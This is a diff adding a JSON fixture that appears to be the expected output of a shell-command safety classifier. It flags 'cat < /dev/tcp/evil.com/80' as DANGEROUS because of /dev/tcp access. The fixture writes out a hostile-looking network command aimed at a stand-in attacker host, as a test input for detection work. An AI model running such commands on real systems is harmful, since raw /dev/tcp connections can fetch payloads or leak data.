@@ -1,0 +1,34 @@
+{
+  "expression": "cat < /dev/tcp/evil.com/80",
+  "classification": "DANGEROUS",
+  "risk": "HIGH",
+  "directories": [],
+  "commands": [
+    {
+      "command": [
+        "cat"
+      ],
+      "argv": [
+        "cat"
+      ],
+      "classification": "DANGEROUS",
+      "risk": "HIGH",
+      "matched_rule": "cat",
+      "classification_reason": "elevated to DANGEROUS: /dev/tcp or /dev/udp access detected",
+      "read_paths": [
+        "/dev/tcp/evil.com/80"
+      ],
+      "inner_commands": []
+    }
+  ],
+  "read_paths": [
+    "/dev/tcp/evil.com/80"
+  ],
+  "redirects": [
+    {
+      "operator": "<",
+      "target": "/dev/tcp/evil.com/80",
+      "affects_classification": false
+    }
+  ]
+}
